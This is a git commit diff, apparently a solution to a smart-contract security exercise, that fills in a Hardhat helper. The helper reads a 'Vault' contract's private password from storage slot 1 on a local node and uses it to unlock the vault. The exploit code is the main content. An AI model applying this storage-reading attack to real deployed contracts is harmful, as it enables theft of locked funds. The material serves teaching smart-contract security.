73049332545b150435fd2ff134c7b7780467d5e2
Rahat <rahat@rahatcodes.com>
2022-07-01 19:19:26 -0400

    vault attacked

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -2,12 +2,16 @@ import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  // connect provider to local instance of blockchain
+  const provider: any = await ethers.getDefaultProvider(
+    "http://localhost:8545"
+  );
+
+  // grab password from storage slot 1 at the victim address
+  const password: any = await provider.getStorageAt(victim.address, 1);
+
+  // unlock vault & profit
+  await victim.unlock(password);
 };
 
 export default helper;
